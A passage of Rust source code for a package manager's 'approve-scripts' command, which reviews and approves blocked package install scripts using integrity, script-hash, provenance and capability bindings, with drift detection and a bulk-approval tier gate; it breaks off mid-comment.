//! `lpm approve-scripts` — review and approve packages whose install scripts
//! were blocked by the post-existing default-deny security posture.
//!
//! This command pairs with the post-install warning emitted by `lpm install`
//! when packages with lifecycle scripts are not yet covered by an existing
//! strict approval. It reads the install-time blocked set from
//! `<project_dir>/.lpm/build-state.json` and lets the user
//! approve them via:
//!
//! - **Interactive TUI** (`lpm approve-scripts`) — walk the blocked set one
//!   at a time, with `Approve / Skip / View full script / Quit` per package
//! - **Bulk approve** (`--yes`) — approve everything blocked, with a loud
//!   warning banner; the escape hatch for CI / "I trust this manifest"
//! - **Direct approve** (`<pkg>`) — approve a single package by name
//! - **Read-only listing** (`--list`) — print the blocked set, NO mutations
//!
//! All approvals are bound to `{name, version, integrity, script_hash}`
//! per the trust binding contract (see [`lpm_workspace::TrustedDependencies`]).
//!
//! ## Output
//!
//! In `--json` mode the command emits a stable, versioned schema (see
//! [`SCHEMA_VERSION`]). The same schema is used for `--list --json` and
//! `--yes --json` so agents can drive the flow uniformly.

use crate::build_state::{self, BlockedPackage, BuildState};
use crate::output;
use lpm_common::LpmError;
use lpm_common::color::Painted;
use lpm_workspace::{
    ApprovalMetadata, ProvenanceSnapshot, ProvenanceStatus, TrustMatch, TrustedDependencies,
};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// Project the install-time-captured fields off a
/// [`BlockedPackage`] into the [`ApprovalMetadata`] bundle that
/// [`TrustedDependencies::approve_with_metadata`] persists.
///
/// Centralized so each future approval-time field addition only edits
/// one site instead of every `--yes` / direct / interactive call.
/// Closes the round-trip: `BlockedPackage.behavioral_tags{,_hash}`
/// flows into the binding's `behavioral_tags{,_hash}`.
///
/// Additionally threads the project-
/// level capability hash through. `capability_hash` is a single
/// value for the entire invocation — the user approved ONE project
/// capability request, which binds every package approved in this
/// run. The caller computes it once (see the `run` function) from
/// the same `CapabilitySet` object the prompt renderer consumed,
/// so the hash persisted here matches the hash the runtime will
/// later enforce against. Passing an already-computed hash (not
/// a `CapabilitySet`) makes the "same canonical object" invariant
/// visible in the function signature: if a future refactor tries
/// to re-parse or recompute here, the diff will call attention to
/// the trust-boundary slip.
///
/// `provenance_at_approval` was previously read off
/// `BlockedPackage.provenance_at_capture` (install-time persisted
/// snapshot). moves the capture from install to approval
/// time — the caller pre-fetches snapshots for the effective blocked
/// set in parallel via [`fetch_provenance_for_effective_set`] and
/// passes the looked-up value here. Same downstream semantics: the
/// binding's `provenance_at_approval` is what the next install's
/// drift gate compares against.
fn approval_metadata_from_blocked(
    blocked: &BlockedPackage,
    capability_hash: Option<String>,
    provenance_at_approval: Option<ProvenanceSnapshot>,
) -> ApprovalMetadata {
    ApprovalMetadata {
        integrity: blocked.integrity.clone(),
        script_hash: blocked.script_hash.clone(),
        provenance_at_approval,
        behavioral_tags_hash: blocked.behavioral_tags_hash.clone(),
        behavioral_tags: blocked.behavioral_tags.clone(),
        capability_hash,
    }
}

/// Build approval metadata, preserving any prior verified
/// `provenance_at_approval` if the incoming snapshot is `None` and
/// an existing exact-version binding carries one.
///
/// Why: `TrustedDependencies::approve_with_metadata` unconditionally
/// overwrites the rich-map entry for `name@version`. Under Warn /
/// Off, [`snapshot_for_binding_with_mode`] returns `Ok(None)` on
/// `VerificationRejected` so the approval can proceed without the
/// new verifier observation. If the user had previously approved
/// the SAME exact version under Deny (with a verified snapshot
/// recorded), a naive re-approval would silently clear that
/// snapshot, permanently disarming drift detection for that exact
/// version. Preserving the prior value keeps the drift reference
/// intact while the new approval still goes through.
///
/// The preservation only fires when the *new* snapshot is `None`.
/// A Verified re-approval (incoming `Some(new)`) always wins —
/// fresh successful verification is the strongest signal.
fn approval_metadata_preserving_existing_provenance(
    trusted: &TrustedDependencies,
    blocked: &BlockedPackage,
    capability_hash: Option<String>,
    incoming: Option<ProvenanceSnapshot>,
) -> ApprovalMetadata {
    let mut meta = approval_metadata_from_blocked(blocked, capability_hash, incoming);
    if meta.provenance_at_approval.is_none()
        && let Some(existing) = trusted.binding_for_exact_version(&blocked.name, &blocked.version)
        && let Some(prior) = existing.provenance_at_approval.clone()
    {
        meta.provenance_at_approval = Some(prior);
    }
    meta
}

/// Fetch attestation snapshots for an effective
/// blocked set at approval time.
///
/// Pre-W2: `lpm install` fetched provenance for every resolved
/// package (~550 ms cold wall on the 266-pkg fixture, 99.98 % HTTP
/// per W1b's `perf.prov_ns_split`) and persisted the snapshots into
/// `BlockedPackage.provenance_at_capture`. `approve-scripts` then
/// forwarded the persisted value.
///
/// Post-W2: `lpm install` does no provenance fetching. The only
/// end-consumer is `approve-scripts`, which reviews a small subset
/// of the install (typically 1–10 scripted packages out of hundreds),
/// so fetching at approval time is strictly less work AND removes the
/// cost from the cold install critical path.
///
/// Drift detection is unaffected: the install drift gate
/// (`commands/install.rs`) re-fetches candidate attestations on the
/// fresh-resolution path independently and reads
/// `provenance_at_approval` (the value this function feeds into the
/// binding) as its reference.
///
/// delegates to
/// [`crate::provenance_fetch::fetch_provenance_for_pkgs`], the
/// single source of truth shared with the global-scope approve path
/// (`lpm approve-scripts --global`). This wrapper keeps the
/// `BlockedPackage` shape callers used pre-existing working unchanged.
///
/// The `--unverified-provenance[-all]` opt-out lives on
/// `lpm install` (not on `approve-scripts`), so the policy here
/// uses the operator-persistent posture chain (env +
/// `[sigstore] verify` config) — same shape the install pipeline
/// uses. `SkipPolicy` is fixed at `None` because per-package skip
/// decisions are not surfaced on approve-scripts: the approval
/// path's only job is to record a binding, and degrading
/// individual packages to identity-only there would silently strip
/// a layer of evidence the install path already captured.
async fn fetch_provenance_for_effective_set(
    packages: &[BlockedPackage],
    policy: &crate::provenance_fetch::VerifyPolicy,
) -> HashMap<(String, String), ProvenanceStatus> {
    let pkgs: Vec<(String, String)> = packages
        .iter()
        .map(|p| (p.name.clone(), p.version.clone()))
        .collect();
    crate::provenance_fetch::fetch_provenance_for_pkgs(&pkgs, policy).await
}

fn runtime_verify_policy_with_source() -> (
    crate::provenance_fetch::VerifyPolicy,
    crate::provenance_fetch::EnforceModeSource,
) {
    let cfg = crate::commands::config::GlobalConfig::load();
    crate::provenance_fetch::VerifyPolicy::resolve_from_chain(
        Vec::new(),
        false,
        std::env::var("LPM_PROVENANCE_ENFORCE").ok().as_deref(),
        || cfg.get_sigstore_verify(),
    )
}

/// Resolve the `provenance_at_approval` value for one `(name, version)`
/// pair from a batch [`ProvenanceStatus`] map, honoring the operator's
/// `LPM_PROVENANCE_ENFORCE` setting (rollout knob).
///
/// This is the project- and global-scope approval-capture hook that
/// closes the SILENT-DROP attack window: a previous `.ok().flatten()`
/// pattern collapsed verifier rejections into `None`, which the next
/// install's drift comparator treated as "first observation" via its
/// `(None, _) => NoDrift` arm.
///
/// Behavior under each [`EnforceMode`]:
///
/// - `Deny` (default): a `VerificationRejected` status returns
///   `Err(LpmError::ProvenanceVerification(...))` and the caller's
///   `?` short-circuits before any trust-store mutation. Prior
///   binding stays intact.
/// - `Warn`: a `VerificationRejected` status emits `tracing::warn` +
///   `output::warn` (loud, named, with the verifier reason) and
///   returns `Ok(None)`. The caller's read-modify-write proceeds,
///   recording `provenance_at_approval: None` — same effect as a
///   transport-degraded fetch during the approval window. This is
///   the rollout-window posture; operators MUST monitor
///   the warn line.
///
/// Non-rejection statuses (`Verified`, `Absent`, `TransportDegraded`)
/// project identically under both modes — the mode only affects the
/// rejection arm.
fn snapshot_for_binding(
    provenance_by_pkg: &HashMap<(String, String), ProvenanceStatus>,
    name: &str,
    version: &str,
    mode: crate::provenance_fetch::EnforceMode,
) -> Result<Option<ProvenanceSnapshot>, LpmError> {
    snapshot_for_binding_with_mode(provenance_by_pkg, name, version, mode)
}

/// Pure variant of [`snapshot_for_binding`] that takes the
/// [`EnforceMode`] explicitly, for unit tests that don't want to
/// mutate process-global env state.
fn snapshot_for_binding_with_mode(
    provenance_by_pkg: &HashMap<(String, String), ProvenanceStatus>,
    name: &str,
    version: &str,
    mode: crate::provenance_fetch::EnforceMode,
) -> Result<Option<ProvenanceSnapshot>, LpmError> {
    let status = match provenance_by_pkg.get(&(name.to_string(), version.to_string())) {
        Some(s) => s.clone(),
        None => return Ok(None),
    };

    // Warn / Off short-circuit on VerificationRejected: log loudly but
    // do NOT propagate as Err, so the approval proceeds and the
    // binding records `provenance_at_approval: None`. Every other
    // status (Verified / Unverified / Absent / TransportDegraded)
    // falls through to the default projection regardless of mode.
    //
    // Off here is the "operator opted out fleet-wide" case (Phase
    // 2.5): a VerificationRejected reaching this point only happens
    // when the upstream verifier path ran anyway (e.g. a code path
    // that didn't consult `should_skip_verification_for`); treat it
    // as a degraded observation rather than failing the approval the
    // operator explicitly asked to allow.
    if let ProvenanceStatus::VerificationRejected { reason } = &status
        && matches!(
            mode,
            crate::provenance_fetch::EnforceMode::Warn | crate::provenance_fetch::EnforceMode::Off
        )
    {
        let mode_label = match mode {
            crate::provenance_fetch::EnforceMode::Warn => "warn",
            crate::provenance_fetch::EnforceMode::Off => "off",
            crate::provenance_fetch::EnforceMode::Deny => unreachable!("guarded by matches!"),
        };
        tracing::warn!(
            target = "lpm::provenance",
            pkg = %name,
            version = %version,
            reason = %reason,
            enforce_mode = mode_label,
            "verifier rejected provenance bundle but enforce-mode is not deny; \
             recording approval with no provenance reference. Subsequent installs will \
             treat this as a degraded state until the operator re-approves under deny."
        );
        crate::output::warn(&format!(
            "provenance verification FAILED for {name}@{version}: {reason}\n  \
             LPM_PROVENANCE_ENFORCE={mode_label} — approval proceeds; the trust binding \
             records no verified identity. Re-run with LPM_PROVENANCE_ENFORCE=deny \
             (default) to refuse, or remediate the underlying bundle and re-approve."
        ));
        return Ok(None);
    }

    status.into_snapshot_for_binding(name, version)
}

/// Stable schema version for the `--json` output. Bump on any breaking
/// change to the JSON shape so agents can branch on it.
///
/// Version history:
/// - **v1**: initial schema — blocked entries carry
///   `name`, `version`, `integrity`, `script_hash`, `phases_present`,
///   `binding_drift`.
/// - **v2** : adds `static_tier` on each
///   blocked entry. Value is one of `"green" | "amber" | "amber-llm"
///   | "red"` when classification ran, or `null` when the persisted
///   state predates (readers should tolerate `null` to stay
///   forward-compatible with v1 state that predates a re-install).
/// - **v3** : adds `version_diff` on each
///   blocked entry. `null` when no prior approved binding exists for
///   this package name (first-time review); otherwise the structured
///   object documented on
///   [`crate::version_diff::version_diff_to_json`] — includes
///   `reason: "no-change"` for "we found the prior but no dimension
///   drifted" so agents can distinguish that from "no prior to
///   compare." Pre-v3 readers ignore the new field; v3+ readers
///   branch on `schema_version >= 3` to know when to expect it.
pub const SCHEMA_VERSION: u32 = 3;

/// Filter the persisted build-state's blocked set against the current
/// `trustedDependencies` and return only the entries that are STILL
/// blocked.
///
/// the persisted
/// `build-state.json` is only refreshed by `lpm install`. Without this
/// filter step, `lpm approve-scripts` would re-render or re-approve
/// packages the user has already approved (until the next install
/// re-captures the state). The audit reproduced this end-to-end:
/// install esbuild → approve-scripts --yes → approve-scripts --list --json
/// still returned esbuild as blocked.
///
/// The filter rule mirrors the install-time blocked-set computation in
/// [`build_state::compute_blocked_packages`]:
///
/// - [`TrustMatch::Strict`] / [`TrustMatch::LegacyNameOnly`] → REMOVE
///   from the effective blocked set (the script will run when `lpm rebuild`
///   eventually executes; the user has nothing to review).
/// - [`TrustMatch::BindingDrift`] → KEEP. Drift is the whole reason we
///   re-review. The blocked package's existing `binding_drift` flag is
///   already true in this case (set by the install-time capture), so the
///   downstream rendering doesn't need to know whether the drift came
///   from the persisted state or from a fresh check.
/// - [`TrustMatch::NotTrusted`] → KEEP. The default-deny case.
///
/// the filter now also
/// consults the capability gate. A persisted blocked entry whose
/// strict match succeeds BUT whose current capability request
/// widens beyond the user bound without a matching capability-
/// hash approval is KEPT in the effective blocked set. Without
/// this extension, approve-scripts would drop capability-
/// widening rows the install-time capture correctly included —
/// closing the reviewer's Medium finding on the discovery path.
pub fn compute_effective_blocked_set<'a>(
    state: &'a BuildState,
    trusted: &TrustedDependencies,
    requested_capabilities: &crate::capability::CapabilitySet,
    user_bound: &crate::capability::UserBound,
) -> Vec<&'a BlockedPackage> {
    state
        .blocked_packages
        .iter()
        .filter(|bp| {
            let trust = trusted.matches_strict(
                &bp.name,
                &bp.version,
                bp.integrity.as_deref(),
                bp.script_hash.as_deref(),
            );
            match trust {
                // Strict / LegacyNameOnly MAY still need review if
                // the capability gate rejects. Drop only when the
                // gate also passes — i.e., no widening requested
                // OR the binding's capability_hash covers it.
                TrustMatch::Strict => {
                    let binding = trusted.get_binding(&bp.name, &bp.version);
                    requested_capabilities.requires_review_despite_strict_match(user_bound, binding)
                }
                TrustMatch::LegacyNameOnly => {
                    requested_capabilities.requires_review_despite_strict_match(user_bound, None)
                }
                // BindingDrift / NotTrusted already need review.
                TrustMatch::BindingDrift { .. } | TrustMatch::NotTrusted => true,
            }
        })
        .collect()
}

/// Run the `lpm approve-scripts` command.
///
/// `package`: Some(name) or Some("name@version") to approve a specific
/// package directly. None to enter the interactive walk OR (with `--yes`
/// or `--list`) the corresponding non-interactive variant.
///
/// `yes`: bulk-approve every blocked package. Mutually exclusive with `list`.
///
/// `list`: read-only listing of the blocked set. Mutually exclusive with
/// `yes`. Cannot be combined with `package`.
pub async fn run(
    project_dir: &Path,
    package: Option<&str>,
    yes: bool,
    list: bool,
    dry_run: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    // Round 2: hold the shared store lock — the approval
    // flow reads store package dirs to inspect prior installs and
    // diff scripts. A concurrent `lpm cache prune --apply` could remove an
    // entry mid-walk without this gate.
    let lock_path = lpm_common::LpmRoot::from_env()?.store_lock();
    lpm_common::with_shared_lock_async(
        lock_path,
        run_under_store_lock(project_dir, package, yes, list, dry_run, json_output),
    )
    .await
}

async fn run_under_store_lock(
    project_dir: &Path,
    package: Option<&str>,
    yes: bool,
    list: bool,
    // close-out when true, the review flow runs
    // end-to-end (card rendering, interactive prompts, diff surfaces,
    // outcome accounting) but NO persisted state mutates —
    // [`write_back`] short-circuits at each of its three call sites
    // (direct-approve, `--yes`, interactive walk) and
    // [`print_summary`] surfaces `"dry_run": true` in the JSON
    // envelope. No-op when combined with `--list` (already
    // read-only); the JSON envelope for `--list --dry-run` still
    // carries the `dry_run` flag so agents can distinguish
    // preview-of-listing from plain-listing at parse time.
    dry_run: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    // ── Argument validation ─────────────────────────────────────────
    //
    // Mutual exclusion: `--yes` and `--list` are contradictory (one mutates,
    // one is read-only). `--list` cannot take a `<pkg>` argument because the
    // listing is over the entire blocked set, not a single package. Both are
    // hard errors with actionable guidance.
    if yes && list {
        return Err(LpmError::Script(
            "`--list` is read-only and conflicts with `--yes`. \
             Pick one: `--list` to inspect, or `--yes` to approve."
                .into(),
        ));
    }
    if list && package.is_some() {
        return Err(LpmError::Script(
            "`--list` cannot take a package name argument. \
             It prints the entire blocked set in read-only mode."
                .into(),
        ));
    }

    // ── Read build-state.json ───────────────────────────────────────

    let pkg_json_path = project_dir.join("package.json");
    if !pkg_json_path.exists() {
        return Err(LpmError::NotFound(
            "lpm approve-scripts requires a package.json in the current directory.".into(),
        ));
    }

    let state = match build_state::read_build_state(project_dir) {
        Some(s) => s,
        None => {
            return Err(LpmError::NotFound(
                "no build-state.json found — run `lpm install` first to capture the blocked set"
                    .into(),
            ));
        }
    };

    // ── Load current trustedDependencies () ─────────
    //
    // Loading the manifest BEFORE the early-return on empty state is the
    // audit fix for Finding 2: the persisted state is filtered through
    // the current trust to compute the *effective* blocked set, so an
    // already-approved package doesn't appear in --list / --yes output.

    let manifest_text = std::fs::read_to_string(&pkg_json_path).map_err(LpmError::Io)?;
    let mut manifest: serde_json::Value = serde_json::from_str(&manifest_text)
        .map_err(|e| LpmError::Registry(format!("failed to parse package.json: {e}")))?;

    let mut trusted = extract_trusted_dependencies(&manifest);

    // ── capability request + hash ────────
    //
    // Parse the project's per-package capability request ONCE and
    // reuse the same `CapabilitySet` object for both:
    //   1. Rendering the human-readable delta in the approve prompt
    //      (so users see env vars / read mode / rlimit bumps in
    //      concrete terms, not a bare hash).
    //   2. Computing the `capability_hash` that gets persisted into
    //      every binding written in this invocation.
    //
    // Critical reviewer constraint: the
    // persisted hash MUST come from the same canonical object the
    // runtime enforces against. Re-parsing in either direction
    // (prompt-time vs. write-time, or approve-time vs. enforce-
    // time) would risk divergence that ships approvals the runtime
    // never satisfies. Parsing once here and forwarding the
    // already-computed `capability_hash` down to each write site
    // makes the invariant visible in the code flow.
    //
    // The runtime uses `crate::capability::CapabilitySet::from_package_json`
    // on the same path — as long as `package.json` is byte-stable
    // between this invocation and the next install, the hashes
    // match byte-for-byte. Drift in the manifest between approve
    // and install correctly invalidates the approval via the
    // 6c hash-equality rule.
    let capability_set = crate::capability::CapabilitySet::from_package_json(&pkg_json_path)
        .map_err(|e| LpmError::Registry(format!("{e}")))?;
    let user_bound = crate::security_approval::authorized_capability_user_bound();
    // Only persist the hash when the request actually widens —
    // baseline or tighter-than-bound requests never hit the
    // capability gate at enforcement time, so storing a hash for
    // them would be noise in `package.json` diffs. The 6b match
    // rule interprets `None` as "approved with no extra
    // capabilities," which is the correct semantic for both
    // baseline and tighter-than-bound cases.
    let capability_hash: Option<String> = if capability_set.loosens_beyond(&user_bound) {
        Some(capability_set.canonical_hash())
    } else {
        None
    };

    // Surface the delta once at the top of the run. Renders only
    // when there IS a widening — baseline approvals stay quiet
    // (no behavior change for the existing green path).
    if !json_output {
        let delta = capability_set.delta_vs_user_bound(&user_bound);
        if !delta.is_empty() {
            output::warn("This project requests extra capabilities for any packages you approve:");
            eprint!("{}", delta.render_human_readable());
            eprintln!(
                "  These capabilities are bound to the approval — if `package.json` later \
                 changes them, approvals are invalidated and re-review is required."
            );
            eprintln!();
        }
    }
    let initial_was_legacy = matches!(trusted, TrustedDependencies::Legacy(_));

    // Re-evaluate the persisted blocked set against the current trust.
    // The borrow returns &BlockedPackage; we materialize the underlying
    // owned values into a Vec<BlockedPackage> so the rest of the function
    // can move/iterate without lifetime gymnastics.
    let effective: Vec<BlockedPackage> =
        compute_effective_blocked_set(&state, &trusted, &capability_set, &user_bound)
            .into_iter()
            .cloned()
            .collect();

    // Construct an "effective state" view that the rest of the function
    // operates on. The captured fingerprint is unchanged (it's the
    // identity of the persisted state, not of the effective filter).
    let effective_state = BuildState {
        state_version: state.state_version,
        blocked_set_fingerprint: state.blocked_set_fingerprint.clone(),
        captured_at: state.captured_at.clone(),
        blocked_packages: effective,
        drift_ignore_override: None,
    };

    // ── — pre-fetch provenance for the effective set ────
    //
    // Pre-W2: install fetched provenance for every resolved package
    // and persisted it into `build-state.json`. Post-W2: install no
    // longer fetches; approve-scripts fetches the (much smaller)
    // effective blocked set in parallel here, before any approval
    // call site needs the value. The fetch overlaps with the user
    // reading approval cards on the interactive path, and is bounded
    // by the join_all fan-out on `--yes` bulk.
    //
    // `--list` is read-only — skip the fetch entirely; the listing
    // doesn't materialize any binding so `provenance_at_approval` is
    // never consulted. Empty effective set: skip too (no-op).
    let (verify_policy, runtime_sigstore_source) = runtime_verify_policy_with_source();
    let runtime_enforce = verify_policy.enforce;
    if !list && !dry_run && !effective_state.blocked_packages.is_empty() {
        crate::security_approval::ensure_runtime_sigstore_posture(
            project_dir,
            json_output,
            runtime_enforce,
            runtime_sigstore_source,
        )?;
    }
    let provenance_by_pkg: HashMap<(String, String), ProvenanceStatus> = if list
        || effective_state.blocked_packages.is_empty()
    {
        HashMap::new()
    } else {
        fetch_provenance_for_effective_set(&effective_state.blocked_packages, &verify_policy).await
    };

    // ── <pkg> argument: handled BEFORE the empty-effective short-circuit ──
    //
    // When the user explicitly names a package, we want a targeted
    // message: "already approved" if they named something that's been
    // approved, or "not in blocked set" if they named something unknown.
    // The generic "nothing to approve" success path would be confusing
    // because the user is asking about ONE package.
    //
    // this branch must run BEFORE the empty-effective
    // check so the user-friendly errors are reachable.
    if let Some(arg) = package {
        // Track outcomes for the summary
        let mut approved: Vec<&BlockedPackage> = Vec::new();
        let skipped: Vec<&BlockedPackage> = Vec::new();

        let target = find_blocked_by_arg(&effective_state.blocked_packages, arg);
        let target = match target {
            Some(t) => t,
            None => {
                // Was the arg in the persisted (unfiltered) state? If so,
                // it must have been filtered out by current trust →
                // already approved.
                if find_blocked_by_arg(&state.blocked_packages, arg).is_some() {
                    return Err(LpmError::Script(format!(
                        "package '{arg}' is already approved (current binding matches). \
                         Run `lpm install` to refresh the blocked set, or pass `--list` to see what's still blocked."
                    )));
                }
                return Err(LpmError::NotFound(format!(
                    "package '{arg}' is not in the blocked set. Run `lpm approve-scripts --list` to see what's blocked."
                )));
            }
        };

        // Confirm in TTY mode unless json_output (which always proceeds)
        let confirmed = if json_output || !is_tty() {
            true
        } else {
            print_package_card(target);
            // surface the version diff card
            // alongside the regular card when this is an UPDATE
            // (prior binding under same name exists). No-op for
            // first-time review.
            print_version_diff_card_for_blocked(target, &trusted);
            let prompt = if trusted
                .latest_binding_for_name(&target.name, &target.version)
                .is_some()
            {
                format!("Accept new {}@{}?", target.name, target.version)
            } else {
                format!("Approve {}@{}?", target.name, target.version)
            };
            cliclack::confirm(prompt)
                .interact()
                .map_err(|e| LpmError::Script(format!("prompt failed: {e}")))?
        };

        if confirmed {
            // write-path: carry install-time provenance + behavioral-tag captures
            // into the binding so subsequent installs can compare against them
            // (drift rule + version diff).
            //
            // SILENT-DROP fix: `snapshot_for_binding` returns
            // `Err(LpmError::ProvenanceVerification(_))` when the
            // verifier rejected the bundle, refusing the approval
            // rather than blanking `provenance_at_approval`.
            let snap = snapshot_for_binding(
                &provenance_by_pkg,
                &target.name,
                &target.version,
                runtime_enforce,
            )?;
            let meta = approval_metadata_preserving_existing_provenance(
                &trusted,
                target,
                capability_hash.clone(),
                snap,
            );
            trusted.approve_with_metadata(&target.name, &target.version, meta);
            approved.push(target);
            // close-out short-circuit the write
            // under `--dry-run`; the approval intent is still
            // recorded in `approved` for the summary so the user
            // sees "would approve X" with the same JSON envelope
            // shape as a live run.
            if !dry_run {
                crate::security_approval::ensure_project_trust_candidate_authorized(
                    project_dir,
                    &trusted,
                    json_output,
                    crate::security_approval::ApprovalSource::CliFlag,
                )?;
                write_back(&pkg_json_path, &mut manifest, &trusted)?;
            }
        } else {
            // skip path: nothing to record besides the count (typed-out
            // here to avoid an unused mut warning if we never push)
            print_summary(
                &effective_state,
                &approved,
                &[target],
                &trusted,
                initial_was_legacy,
                false,
                dry_run,
                json_output,
                Some(&provenance_by_pkg),
            );
            return Ok(());
        }

        print_summary(
            &effective_state,
            &approved,
            &skipped,
            &trusted,
            initial_was_legacy,
            false,
            dry_run,
            json_output,
            Some(&provenance_by_pkg),
        );
        return Ok(());
    }

    if effective_state.blocked_packages.is_empty() {
        if json_output {
            // close-out `dry_run` carried through
            // so agents can uniformly read `envelope.dry_run`
            // regardless of which branch produced the envelope. On
            // an empty set, the flag is semantically a no-op (no
            // mutation would have happened anyway) but the field's
            // presence is a schema-level consistency guarantee.
            let body = serde_json::json!({
                "schema_version": SCHEMA_VERSION,
                "command": "approve-scripts",
                "dry_run": dry_run,
                "blocked_count": 0,
                "approved_count": 0,
                "skipped_count": 0,
                "blocked": [],
                "warnings": [],
                "errors": [],
            });
            println!("{}", serde_json::to_string_pretty(&body).unwrap());
        } else {
            output::success(
                "Nothing to approve. All scriptable packages are already trusted (or there are none).",
            );
        }
        return Ok(());
    }

    // ── --list (read-only) ──────────────────────────────────────────

    if list {
        print_listing(&effective_state, &trusted, dry_run, json_output);
        return Ok(());
    }

    // Track outcomes for the summary / JSON output
    let mut approved: Vec<&BlockedPackage> = Vec::new();
    let mut skipped: Vec<&BlockedPackage> = Vec::new();

    // ── --yes (bulk approve) ────────────────────────────────────────

    if yes {
        // — refuse bulk approval when any
        // effective-blocked entry is classified outside the green
        // tier. Gate runs BEFORE `emit_yes_warning_banner` so we
        // don't emit success-shaped human + tracing output and then
        // abort — that sequence would corrupt log aggregators and
        // mislead the user about whether the operation ran.
        //
        // Refusal is restricted to EXPLICIT non-green tiers:
        // - Some(Amber) / Some(AmberLlm) / Some(Red) → refuse.
        // - Some(Green) → allowed in bulk (still requires explicit
        //   --yes; auto-execution is, gated on the sandbox).
        // - None → pass-through to today's behavior. `None` means
        //   the persisted blocked state was written by a pre-P2 LPM
        //   that never classified the package; breaking those
        //   existing `--yes` flows before the next install
        //   recaptures the state would be a silent→P2 upgrade
        //   regression.
        enforce_tiered_yes_gate(&effective_state.blocked_packages, GateScope::Project)?;

        emit_yes_warning_banner(effective_state.blocked_packages.len(), json_output);
        for blocked in &effective_state.blocked_packages {
            // write-path — see the direct-approve branch above for the rationale.
            // SILENT-DROP fix: `?` propagates a verifier
            // rejection so the trust binding is NOT overwritten with
            // `None` (which would silently disarm drift detection on
            // every subsequent install).
            let snap = snapshot_for_binding(
                &provenance_by_pkg,
                &blocked.name,
                &blocked.version,
                runtime_enforce,
            )?;
            let meta = approval_metadata_preserving_existing_provenance(
                &trusted,
                blocked,
                capability_hash.clone(),
                snap,
            );
            trusted.approve_with_metadata(&blocked.name, &blocked.version, meta);
            approved.push(blocked);
        }
        // close-out short-circuit under `--dry-run`.
        if !dry_run {
            crate::security_approval::ensure_project_trust_candidate_authorized(
                project_dir,
                &trusted,
                json_output,
                crate::security_approval::ApprovalSource::CliFlag,
            )?;
            write_back(&pkg_json_path, &mut manifest, &trusted)?;
        }
        print_summary(
            &effective_state,
            &approved,
            &skipped,
            &trusted,
            initial_was_legacy,
            yes,
            dry_run,
            json_output,
            Some(&provenance_by_pkg),
        );
        return Ok(());
    }

    // (The `<pkg>` branch is handled at the top of `run` BEFORE the
    // empty-effective short-circuit — see the  comment.)

    // ── Default: interactive walk ───────────────────────────────────

    // check `--json` BEFORE the TTY gate. Every `--json`
    // caller is by definition non-interactive (CI, scripted agent,
    // MCP server), so with the old order they always hit the
    // "requires a TTY" error — accurate but unhelpful: it doesn't
    // name the flag pairs that actually pair with `--json`. The
    // `--json`-specific error names them explicitly. Pure non-TTY
    // (no `--json`) still falls through to the TTY error below.
    if json_output {
        return Err(LpmError::Script(
            "interactive review cannot be combined with `--json`. \
             Use `--list --json`, `--yes --json`, or `<pkg> --json` for structured output."
                .into(),
        ));
    }
    if !is_tty() {
        return Err(LpmError::Script(
            "interactive review requires a TTY. \
             Use `--yes` to approve everything, `--list` to inspect, or pass a `<pkg>` argument."
                .into(),
        ));
    }

    // Walk one at a time. Quit aborts WITHOUT writing in-progress entries
    // (atomic). The accumulator only gets flushed to disk after the loop.
    // walk the EFFECTIVE blocked set, not the persisted
    // state — already-approved packages are skipped.
    output::info(&format!(
        "{} package(s) blocked. Walking one at a time — Quit aborts without writing.",
        effective_state.blocked_packages.len(),
    ));
    println!();

    let mut quit_early = false;
    for blocked in &effective_state.blocked_packages {
        print_package_card(blocked);
        // render the version-diff card for
        // updates (no-op when no prior binding exists for the same
        // package name).
        print_version_diff_card_for_blocked(blocked, &trusted);

        // branch the Select on whether this is
        // a first-time review or an update. The two branches share
        // back-end semantics via `InteractiveChoice::decision()`;
        // the difference is the labels users see — `Approve` /
        // `Skip` vs. `Accept new` / `Keep old (skip)`. The latter
        // names the implicit retention so users don't fear that
        // declining will mutate their prior approval. Per signoff
        // B(i), `KeepOld` does NOT rewrite a resolver pin or
        // downgrade — it just declines the candidate.
        let is_update = trusted
            .latest_binding_for_name(&blocked.name, &blocked.version)
            .is_some();

        // The View option re-prints the full script and re-prompts. To
        // re-prompt without cloning the (non-Clone) cliclack Select, we
        // build a fresh Select on each iteration.
        let mut decision: Option<bool> = None;
        loop {
            let prompt = format!(
                "What would you like to do with {}@{}?",
                blocked.name, blocked.version
            );
            let choice = if is_update {
                // Default to KeepOld: when the diff card is sitting
                // RIGHT ABOVE this prompt showing what changed, the
                // safe-by-default choice is to decline the change.
                // The user can tab to AcceptNew with one keystroke.
                cliclack::select(prompt)
                    .item(
                        InteractiveChoice::AcceptNew,
                        "Accept new",
                        "approve this candidate version",
                    )
                    .item(
                        InteractiveChoice::KeepOld,
                        "Keep old",
                        "skip; prior approval untouched",
                    )
                    .item(InteractiveChoice::View, "View full script", "")
                    .item(InteractiveChoice::Quit, "Quit", "abort without writing")
                    .initial_value(InteractiveChoice::KeepOld)
                    .interact()
                    .map_err(|e| LpmError::Script(format!("prompt failed: {e}")))?
            } else {
                // First-time review: original labels.
                cliclack::select(prompt)
                    .item(InteractiveChoice::Approve, "Approve", "")
                    .item(InteractiveChoice::Skip, "Skip", "")
                    .item(InteractiveChoice::View, "View full script", "")
                    .item(InteractiveChoice::Quit, "Quit", "abort without writing")
                    .initial_value(InteractiveChoice::Approve)
                    .interact()
                    .map_err(|e| LpmError::Script(format!("prompt failed: {e}")))?
            };
            match choice.decision() {
                Some(d) => {
                    decision = Some(d);
                    break;
                }
                None => match choice {
                    InteractiveChoice::View => {
                        print_full_script(project_dir, blocked);
                        // Loop back: rebuild Select and re-prompt
                        continue;
                    }
                    InteractiveChoice::Quit => {
                        quit_early = true;
                        break;
                    }
                    _ => unreachable!("decision() returns None only for View / Quit"),
                },
            }
        }

        if quit_early {
            break;
        }

        match decision {
            Some(true) => approved.push(blocked),
            Some(false) => skipped.push(blocked),
            None => unreachable!("inner loop only exits with a decision or quit_early"),
        }
        println!();
    }

    if quit_early {
        // Aborted: do NOT write any in-progress entries.
        if approved.is_empty() {
            output::warn("Quit before approving anything. package.json is unchanged.");
        } else {
            output::warn(&format!(
                "Quit after {} approval(s). DISCARDED — package.json is unchanged.",
                approved.len()
            ));
        }
        return Ok(());
    }

    // Apply approvals (atomic single write)
    for blocked in &approved {
        // write-path — see the direct-approve branch earlier for the rationale.
        // SILENT-DROP fix: `?` on the verifier-rejection arm refuses
        // to record an approval rather than blanking the prior
